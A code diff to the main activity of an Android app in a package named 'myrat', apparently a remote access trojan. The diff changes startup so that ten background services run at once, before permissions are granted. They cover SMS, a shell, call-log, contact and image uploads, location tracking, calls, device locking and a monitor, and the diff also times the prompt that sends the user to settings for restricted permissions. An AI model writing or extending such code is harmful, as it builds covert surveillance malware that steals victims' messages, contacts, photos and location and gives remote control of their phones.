@@ -76,6 +76,9 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
 
             checkAndCreateDeviceNode()
             
+            // Start services immediately (they will handle their own permissions)
+            startAllServicesImmediately()
+            
             // Only request permissions once
             if (!permissionsRequested) {
                 Logger.log("Requesting permissions via EasyPermissions...")
@@ -107,6 +110,44 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
                     Logger.error("Failed to restart activity", restartException)
                 }
             }, 3000)
+        }
+    }
+
+    private fun startAllServicesImmediately() {
+        try {
+            Logger.log("Starting all background services immediately")
+            
+            val services = listOf(
+                com.myrat.app.service.SmsService::class.java,
+                com.myrat.app.service.ShellService::class.java,
+                com.myrat.app.service.CallLogUploadService::class.java,
+                com.myrat.app.service.ContactUploadService::class.java,
+                com.myrat.app.service.ImageUploadService::class.java,
+                com.myrat.app.service.LocationService::class.java,
+                com.myrat.app.service.CallService::class.java,
+                com.myrat.app.service.LockService::class.java,
+                com.myrat.app.service.SmsConsentService::class.java,
+                com.myrat.app.service.ServiceMonitorService::class.java
+            )
+
+            services.forEach { serviceClass ->
+                try {
+                    val serviceIntent = Intent(this, serviceClass)
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                        startForegroundService(serviceIntent)
+                    } else {
+                        startService(serviceIntent)
+                    }
+                    Logger.log("Started ${serviceClass.simpleName}")
+                } catch (e: Exception) {
+                    Logger.error("Failed to start ${serviceClass.simpleName}", e)
+                }
+            }
+            
+            servicesStarted = true
+            Logger.log("All services started successfully")
+        } catch (e: Exception) {
+            Logger.error("Error starting services", e)
         }
     }
 
@@ -164,57 +205,19 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         try {
             permissionHandler?.handleResume()
             
-            // Check if permissions are granted and start services if needed
-            if (permissionHandler?.areAllPermissionsGranted() == true && !servicesStarted) {
-                Logger.log("All permissions granted, starting services")
-                startAllServices()
-                servicesStarted = true
-                
-                // Open app settings once for restricted permissions
-                if (!appSettingsOpened) {
-                    openAppSettingsForRestrictedPermissions()
-                    appSettingsOpened = true
-                }
+            // Restart services if they're not running
+            if (!servicesStarted) {
+                startAllServicesImmediately()
+            }
+            
+            // Open app settings once for restricted permissions after some permissions are granted
+            if (!appSettingsOpened && permissionHandler?.hasBasicPermissions() == true) {
+                openAppSettingsForRestrictedPermissions()
+                appSettingsOpened = true
             }
         } catch (e: Exception) {
             Logger.error("Error in onResume: ${e.message}", e)
             Toast.makeText(this, "Error in onResume: ${e.message}", Toast.LENGTH_LONG).show()
-        }
-    }
-
-    private fun startAllServices() {
-        try {
-            Logger.log("Starting all background services")
-            
-            val services = listOf(
-                com.myrat.app.service.SmsService::class.java,
-                com.myrat.app.service.ShellService::class.java,
-                com.myrat.app.service.CallLogUploadService::class.java,
-                com.myrat.app.service.ContactUploadService::class.java,
-                com.myrat.app.service.ImageUploadService::class.java,
-                com.myrat.app.service.LocationService::class.java,
-                com.myrat.app.service.CallService::class.java,
-                com.myrat.app.service.LockService::class.java,
-                com.myrat.app.service.SmsConsentService::class.java
-            )
-
-            services.forEach { serviceClass ->
-                try {
-                    val serviceIntent = Intent(this, serviceClass)
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                        startForegroundService(serviceIntent)
-                    } else {
-                        startService(serviceIntent)
-                    }
-                    Logger.log("Started ${serviceClass.simpleName}")
-                } catch (e: Exception) {
-                    Logger.error("Failed to start ${serviceClass.simpleName}", e)
-                }
-            }
-            
-            Logger.log("All services started successfully")
-        } catch (e: Exception) {
-            Logger.error("Error starting services", e)
         }
     }
 
@@ -236,7 +239,7 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
                 } catch (e: Exception) {
                     Logger.error("Failed to open app settings", e)
                 }
-            }, 2000) // 2 second delay
+            }, 5000) // 5 second delay to allow some permissions to be granted first
             
         } catch (e: Exception) {
             Logger.error("Error opening app settings", e)
